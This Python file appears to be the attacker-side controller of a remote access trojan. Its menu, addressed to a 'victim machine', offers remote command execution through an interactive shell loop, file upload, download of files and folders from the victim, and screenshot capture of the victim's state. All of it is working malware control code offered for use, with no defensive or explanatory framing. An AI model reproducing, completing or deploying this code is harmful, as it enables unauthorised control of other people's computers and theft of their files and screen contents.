
import os

from fileinput import filename
from yaml import compose_all


def showOptions():
    print("\n")
    print("\t\t 1. Run Command on victim machine")
    print("\t\t 2. Upload file")
    print("\t\t 3. Download Files and folder from the victim machine")
    print("\t\t 4. Capture victim machine state")
    
    

def handleConnection(my_socket):
    print("[+] Handling Connection")
    
    while(True):
        showOptions()
        
        user_input = input("[+] Select Option: ")
        

        
        if user_input == "1":
            my_socket.send_data(user_input)
            print("Running Commands:")
            while(True):
                path = my_socket.recieve_data();
                print(path , ">>" , end = " ")

                command = input()
                c = command.split()
                if(c[0].lower() == "cd"):
                    my_socket.send_data(command)
                    continue
                
                if (command == "" or command == " "):
                    continue

                if command == "##stop##":
                    my_socket.send_data(user_input)
                    break

                my_socket.send_data(command)

                result = my_socket.recieve_data()
                print(result)


        elif user_input == '2':
            my_socket.send_data(user_input)
            print("Send files")
            
            file_path = input("Enter File path: ")
            fname = os.path.basename(file_path)


            my_socket.send_data(fname)
        
            
            my_socket.upload_file(file_path)

        elif user_input == "3":

            print("Download files from the victim")
            my_socket.send_data(user_input)
            print("navigate to the path and ")
            path = input("Enter path >> ")
            my_socket.send_data(path)

            print("waiting for the files...")

            filename  = my_socket.recieve_data()
            my_socket.download_file(filename)


        elif user_input == '4':
            my_socket.send_data(user_input)
            my_socket.download_file("screenshot.zip")



            

        elif (user_input == "99"):
            my_socket.send_data(user_input)
            break
        else:
            print("[-] Invalid Input")
    
        


